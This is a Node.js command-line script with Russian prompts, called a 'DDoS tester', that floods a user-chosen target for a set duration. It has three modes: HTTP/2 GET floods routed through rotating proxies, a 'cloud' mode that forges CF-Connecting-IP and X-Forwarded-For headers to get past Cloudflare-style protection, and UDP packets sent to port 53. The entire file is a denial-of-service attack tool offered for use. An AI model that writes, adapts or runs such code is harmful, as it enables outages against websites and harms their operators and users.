const { auto } = require('http2-wrapper');
const readline = require('readline-sync');
const fs = require('fs');
const dgram = require('dgram');
const { HttpsProxyAgent } = require('tunnel');

function loadProxies(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf-8').split('\n').map(p => p.trim()).filter(p => p.length > 0);
  } catch {
    console.error('[!] Прокси файл не найден!');
    process.exit(1);
  }
}

async function sendHttp2(target, proxy, headers = {}) {
  try {
    const [host, port] = proxy.split(':');
    const agent = new HttpsProxyAgent({ host, port: parseInt(port) });

    const request = await auto({
      method: 'GET',
      url: target,
      agent: { https: agent },
      headers: {
        'user-agent': headers['user-agent'] || 'Mozilla/5.0',
        ...headers
      },
    });

    request.on('response', res => {
      res.on('data', () => {});
      res.on('end', () => {});
    });

    request.on('error', () => {});
  } catch (err) {}
}

function dnsFlood(host) {
  const client = dgram.createSocket('udp4');
  const message = Buffer.alloc(128, 'A');
  const port = 53;

  client.send(message, 0, message.length, port, host, err => {
    if (err) client.close();
  });
}

async function runAttack(method, target, proxies, threads, duration) {
  const end = Date.now() + duration * 1000;

  while (Date.now() < end) {
    let batch = [];

    for (let i = 0; i < threads; i++) {
      const proxy = proxies[Math.floor(Math.random() * proxies.length)];

      if (method === 'http2') {
        batch.push(sendHttp2(target, proxy));
      } else if (method === 'cloud') {
        const headers = {
          'user-agent': `CF-Bypass/${Math.random()}`,
          'cf-connecting-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.1`,
          'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.1`
        };
        batch.push(sendHttp2(target, proxy, headers));
      } else if (method === 'dns') {
        batch.push(new Promise(resolve => {
          dnsFlood(target.replace(/^https?:\/\//, ''));
          resolve();
        }));
      }
    }

    await Promise.all(batch);
  }
}

async function main() {
  console.log('\n=== Многофункциональный DDoS Тестер ===');
  const method = readline.question('Метод (http2 / cloud / dns): ');
  const target = readline.question('Цель (https://example.com): ');
  const threads = parseInt(readline.question('Мощность (кол-во потоков): '));
  const duration = parseInt(readline.question('Время (в секундах): '));
  const proxyFile = readline.question('Файл с прокси (proxies.txt): ');

  const proxies = loadProxies(proxyFile);
  if (proxies.length === 0) {
    console.error('[!] Нет доступных прокси!');
    return;
  }

  console.log(`\n[>] Запуск метода ${method} на ${target}...`);
  await runAttack(method, target, proxies, threads, duration);
  console.log('[✓] Завершено.');
}

main();
